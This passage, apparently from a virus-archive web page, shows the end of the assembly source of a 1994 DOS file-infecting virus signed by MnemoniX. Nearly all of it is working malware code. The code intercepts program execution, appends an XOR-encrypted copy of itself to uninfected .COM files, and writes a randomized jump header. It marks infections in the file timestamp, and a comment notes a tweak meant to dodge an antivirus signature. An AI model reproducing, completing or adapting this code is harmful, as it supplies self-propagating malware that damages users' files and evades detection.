                <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">ax</span> <span style="color: #46aa03; font-weight: bold;">bx</span> <span style="color: #46aa03; font-weight: bold;">si</span> <span style="color: #46aa03; font-weight: bold;">es</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2Fh</span>                  <span style="color: black; font-style: italic;">; find DTA</span>
                <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">21h</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">si</span>                   <span style="color: black; font-style: italic;">; verify that this is a .COM</span>
find_ext<span style="color: #339933;">:</span>
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span> <span style="color: #339933;">+</span> <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">'.'</span>
                <span style="color: #00007f; font-weight: bold;">je</span>      found_ext
                <span style="color: #00007f; font-weight: bold;">inc</span>     <span style="color: #46aa03; font-weight: bold;">si</span>
                <span style="color: #00007f; font-weight: bold;">jmp</span>     find_ext
found_ext<span style="color: #339933;">:</span>
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span> <span style="color: #339933;">+</span> <span style="color: #46aa03; font-weight: bold;">si</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">1</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #7f007f;">'OC'</span>
                <span style="color: #00007f; font-weight: bold;">jne</span>     fixed_2                 <span style="color: black; font-style: italic;">; if not .COM, skip</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">16h</span><span style="color: black;">&#93;</span>
                <span style="color: #00007f; font-weight: bold;">and</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">31</span>                   <span style="color: black; font-style: italic;">; check for infection marker</span>
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">26</span>
                <span style="color: #00007f; font-weight: bold;">jne</span>     fixed_2                 <span style="color: black; font-style: italic;">; not found, skip</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">sub</span>     <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">1Ah</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span>VIRUS_SIZE <span style="color: #339933;">+</span> HEADER_SIZE
                <span style="color: #00007f; font-weight: bold;">sbb</span>     <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">1Ch</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span>
fixed_2<span style="color: #339933;">:</span>
                <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">es</span> <span style="color: #46aa03; font-weight: bold;">si</span> <span style="color: #46aa03; font-weight: bold;">bx</span> <span style="color: #46aa03; font-weight: bold;">ax</span>             <span style="color: black; font-style: italic;">; done</span>
                <span style="color: #00007f; font-weight: bold;">clc</span>
                retf    <span style="color: #ff0000;">2</span>
&nbsp;
execute<span style="color: #339933;">:</span>
                <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">ax</span> <span style="color: #46aa03; font-weight: bold;">bx</span> <span style="color: #46aa03; font-weight: bold;">cx</span> <span style="color: #46aa03; font-weight: bold;">dx</span> <span style="color: #46aa03; font-weight: bold;">di</span> <span style="color: #46aa03; font-weight: bold;">ds</span> <span style="color: #46aa03; font-weight: bold;">es</span>    <span style="color: black; font-style: italic;">; file execute ... check</span>
                                                <span style="color: black; font-style: italic;">; if uninfected .COM file,</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3D00h</span>                <span style="color: black; font-style: italic;">; and if so, infect</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    int_21
                <span style="color: #00007f; font-weight: bold;">jnc</span>     read_header
                <span style="color: #00007f; font-weight: bold;">jmp</span>     exec_exit               <span style="color: black; font-style: italic;">; can't open, leave</span>
&nbsp;
read_header<span style="color: #339933;">:</span>
                <span style="color: #00007f; font-weight: bold;">xchg</span>    <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">bx</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">bx</span>                      <span style="color: black; font-style: italic;">; save file handle</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1220h</span>                <span style="color: black; font-style: italic;">; get system file table</span>
                <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">2Fh</span>                     <span style="color: black; font-style: italic;">; entry</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">nop</span>                             <span style="color: black; font-style: italic;">; remove this if you don't</span>
                                                <span style="color: black; font-style: italic;">; mind scanning as [512] under</span>
                                                <span style="color: black; font-style: italic;">; SCAN ...</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">di</span><span style="color: black;">&#93;</span>              <span style="color: black; font-style: italic;">; get number of the SFT</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1216h</span>                <span style="color: black; font-style: italic;">; for this handle</span>
                <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">2Fh</span>                     <span style="color: black; font-style: italic;">; ES:DI now points to SFT</span>
                <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">bx</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">di</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">2</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2</span>  <span style="color: black; font-style: italic;">; change open mode to R/W</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">di</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">13</span><span style="color: black;">&#93;</span>   <span style="color: black; font-style: italic;">; save file date</span>
                <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">di</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">15</span><span style="color: black;">&#93;</span>   <span style="color: black; font-style: italic;">; and file time</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">di</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">11h</span><span style="color: black;">&#93;</span>
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">62579</span> <span style="color: #339933;">-</span> VIRUS_SIZE   <span style="color: black; font-style: italic;">; too big?</span>
                <span style="color: #00007f; font-weight: bold;">je</span>      exec_close
&nbsp;
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">22</span>                   <span style="color: black; font-style: italic;">; too small?</span>
                <span style="color: #00007f; font-weight: bold;">jb</span>      exec_close
&nbsp;
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span>HEADER_SIZE <span style="color: #339933;">-</span> <span style="color: #ff0000;">3</span>      <span style="color: black; font-style: italic;">; calculate virus offset</span>
&nbsp;
&nbsp;
                <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">cs</span>
                <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">ds</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span>virus_offset<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3Fh</span>                  <span style="color: black; font-style: italic;">; read header of file</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span>HEADER_SIZE          <span style="color: black; font-style: italic;">; to check for infection</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>offset read_buffer
                <span style="color: #00007f; font-weight: bold;">call</span>    int_21
&nbsp;
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span>read_buffer<span style="color: #339933;">,</span><span style="color: #7f007f;">'ZM'</span>
                <span style="color: #00007f; font-weight: bold;">je</span>      exec_close              <span style="color: black; font-style: italic;">; don't infect .EXE</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span>read_buffer<span style="color: black;">&#91;</span>MARKER<span style="color: black;">&#93;</span><span style="color: #339933;">,</span>ID  <span style="color: black; font-style: italic;">; if infected</span>
                <span style="color: #00007f; font-weight: bold;">je</span>      exec_close              <span style="color: black; font-style: italic;">; already, skip it</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4202h</span>                <span style="color: black; font-style: italic;">; move to end of file</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    move_ptr_write
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>offset read_buffer   <span style="color: black; font-style: italic;">; and save header</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    int_21
&nbsp;
                <span style="color: #00007f; font-weight: bold;">call</span>    encrypt_code            <span style="color: black; font-style: italic;">; encrypt the virus code</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    create_header           <span style="color: black; font-style: italic;">; and create unique header</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">40h</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span>VIRUS_SIZE           <span style="color: black; font-style: italic;">; write virus code to file</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>offset encrypt_buffer
                <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">21h</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4200h</span>                <span style="color: black; font-style: italic;">; back to beginning of file</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    move_ptr_write
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>offset new_header    <span style="color: black; font-style: italic;">; write new header</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    int_21
&nbsp;
                <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">dx</span>                      <span style="color: black; font-style: italic;">; restore file date &amp; time</span>
                <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">cx</span>
                <span style="color: #00007f; font-weight: bold;">and</span>     <span style="color: #46aa03; font-weight: bold;">cl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0E0h</span>                 <span style="color: black; font-style: italic;">; but with timestamp</span>
                <span style="color: #00007f; font-weight: bold;">or</span>      <span style="color: #46aa03; font-weight: bold;">cl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">26</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">5701h</span>
                <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">21h</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3Eh</span>                  <span style="color: black; font-style: italic;">; close file</span>
                <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">21h</span>
&nbsp;
exec_exit<span style="color: #339933;">:</span>
                <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">es</span> <span style="color: #46aa03; font-weight: bold;">ds</span> <span style="color: #46aa03; font-weight: bold;">di</span> <span style="color: #46aa03; font-weight: bold;">dx</span> <span style="color: #46aa03; font-weight: bold;">cx</span> <span style="color: #46aa03; font-weight: bold;">bx</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">jmp</span>     int_21_exit
&nbsp;
move_ptr_write<span style="color: #339933;">:</span>
                <span style="color: #00007f; font-weight: bold;">cwd</span>                             <span style="color: black; font-style: italic;">; move file pointer</span>
                <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cx</span>
                <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">21h</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span>HEADER_SIZE          <span style="color: black; font-style: italic;">; and prepare for write </span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">40h</span>                  <span style="color: black; font-style: italic;">; to file</span>
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
exec_close<span style="color: #339933;">:</span>
                <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">ax</span> <span style="color: #46aa03; font-weight: bold;">ax</span>                   <span style="color: black; font-style: italic;">; clean off stack</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3Eh</span>                  <span style="color: black; font-style: italic;">; and close</span>
                <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">21h</span>
                <span style="color: #00007f; font-weight: bold;">jmp</span>     exec_exit
&nbsp;
encrypt_code    proc    near
&nbsp;
                <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">si</span> <span style="color: #46aa03; font-weight: bold;">es</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">cs</span>
                <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">es</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ah</span>                   <span style="color: black; font-style: italic;">; get random no.</span>
                <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">1Ah</span>                     <span style="color: black; font-style: italic;">; and store in decryption</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     cipher<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span>               <span style="color: black; font-style: italic;">; module</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span>virus_offset
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span>DECRYPTOR_SIZE <span style="color: #339933;">+</span> <span style="color: #ff0000;">103h</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     code_offset<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span>offset virus_begin   <span style="color: black; font-style: italic;">; first store header</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span>offset encrypt_buffer
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span>DECRYPTOR_SIZE
                <span style="color: #00007f; font-weight: bold;">rep</span>     <span style="color: #00007f; font-weight: bold;">movsb</span>                   <span style="color: black; font-style: italic;">; (unencryted)</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span>ENCRYPTED_SIZE <span style="color: #339933;">/</span> <span style="color: #ff0000;">2</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">1</span> <span style="color: black; font-style: italic;">; now encrypt &amp; store code</span>
&nbsp;
encrypt<span style="color: #339933;">:</span>
                <span style="color: #00007f; font-weight: bold;">lodsw</span>                           <span style="color: black; font-style: italic;">; simple encryption routine</span>
                <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span>
                <span style="color: #00007f; font-weight: bold;">ror</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span>
                <span style="color: #00007f; font-weight: bold;">stosw</span>
                <span style="color: #00007f; font-weight: bold;">loop</span>    encrypt
&nbsp;
                <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">es</span> <span style="color: #46aa03; font-weight: bold;">si</span>
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
encrypt_code    endp
&nbsp;
create_header   proc    near
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span>virus_offset      <span style="color: black; font-style: italic;">; fix up addresses in new</span>
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">103h</span> <span style="color: #339933;">+</span> <span style="color: black;">&#40;</span>offset decrypt <span style="color: #339933;">-</span> offset virus_begin<span style="color: black;">&#41;</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span>mov_1<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span>             <span style="color: black; font-style: italic;">; header</span>
                <span style="color: #00007f; font-weight: bold;">inc</span>     <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">inc</span>     <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span>mov_2<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ah</span>                   <span style="color: black; font-style: italic;">; fill in useless MOVs</span>
                <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">1Ah</span>                     <span style="color: black; font-style: italic;">; with random bytes</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span>mov_al<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cl</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span>mov_ax<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">es</span> <span style="color: #46aa03; font-weight: bold;">cs</span>
                <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">es</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span>offset encrypt_buffer
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span>offset decrypt <span style="color: #339933;">-</span> offset virus_begin
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span>                   <span style="color: black; font-style: italic;">; now fill decryption module</span>
                <span style="color: #00007f; font-weight: bold;">neg</span>     <span style="color: #46aa03; font-weight: bold;">ax</span>                      <span style="color: black; font-style: italic;">; with some garbage</span>
                <span style="color: #00007f; font-weight: bold;">stosw</span>
                <span style="color: #00007f; font-weight: bold;">rol</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span>
                <span style="color: #00007f; font-weight: bold;">stosw</span>
                <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">es</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">sub</span>     <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span>virus_offset<span style="color: #339933;">,</span><span style="color: #ff0000;">17</span> <span style="color: black; font-style: italic;">; fix up JMP instruction</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">ret</span>                             <span style="color: black; font-style: italic;">; done</span>
create_header   endp
&nbsp;
new_header      <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">0C7h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">06</span>
mov_1           <span style="color: #0000ff; font-weight: bold;">dw</span>      <span style="color: #ff0000;">00</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">31h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">07</span>                  <span style="color: black; font-style: italic;">; first MOV            6</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">0B0h</span>
mov_al          <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">00</span>                      <span style="color: black; font-style: italic;">; a nothing MOV AL,    2</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">0C7h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">06</span>
mov_2           <span style="color: #0000ff; font-weight: bold;">dw</span>      <span style="color: #ff0000;">00</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">0D1h</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0C8h</span>               <span style="color: black; font-style: italic;">; second MOV           6</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">0B8h</span>
mov_ax          <span style="color: #0000ff; font-weight: bold;">dw</span>      <span style="color: #ff0000;">00</span>                      <span style="color: black; font-style: italic;">; a nothing MOV AX,    3</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">0E9h</span>                    <span style="color: black; font-style: italic;">; jump instruction     1</span>
virus_offset    <span style="color: #0000ff; font-weight: bold;">dw</span>      <span style="color: #ff0000;">0</span>                       <span style="color: black; font-style: italic;">; virus offset         2</span>
                <span style="color: #0000ff; font-weight: bold;">dw</span>      ID                      <span style="color: black; font-style: italic;">; ID marker            2</span>
                                                <span style="color: black; font-style: italic;">; total bytes =       22</span>
&nbsp;
sig             <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #7f007f;">'[100%] By MnemoniX 1994'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span>
&nbsp;
virus_end<span style="color: #339933;">:</span>
&nbsp;
VIRUS_SIZE      <span style="color: #0000ff; font-weight: bold;">equ</span>     offset virus_end <span style="color: #339933;">-</span> offset virus_begin
&nbsp;
read_buffer     <span style="color: #0000ff; font-weight: bold;">dw</span>      HEADER_SIZE dup <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span>     <span style="color: black; font-style: italic;">; storage for orig header</span>
encrypt_buffer  <span style="color: #0000ff; font-weight: bold;">dw</span>      VIRUS_SIZE dup <span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span>      <span style="color: black; font-style: italic;">; storage for encrypted virus</span>
&nbsp;
heap_end<span style="color: #339933;">:</span>
&nbsp;
MEM_SIZE        <span style="color: #0000ff; font-weight: bold;">equ</span>     offset heap_end <span style="color: #339933;">-</span> offset <span style="color: #0000ff; font-weight: bold;">start</span>
DECRYPTOR_SIZE  <span style="color: #0000ff; font-weight: bold;">equ</span>     offset virus_code <span style="color: #339933;">-</span> offset virus_begin
ENCRYPTED_SIZE  <span style="color: #0000ff; font-weight: bold;">equ</span>     offset virus_end <span style="color: #339933;">-</span> offset virus_code
&nbsp;
<span style="color: #0000ff; font-weight: bold;">code</span>            ends
                end     <span style="color: #0000ff; font-weight: bold;">start</span>
&nbsp;</pre></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
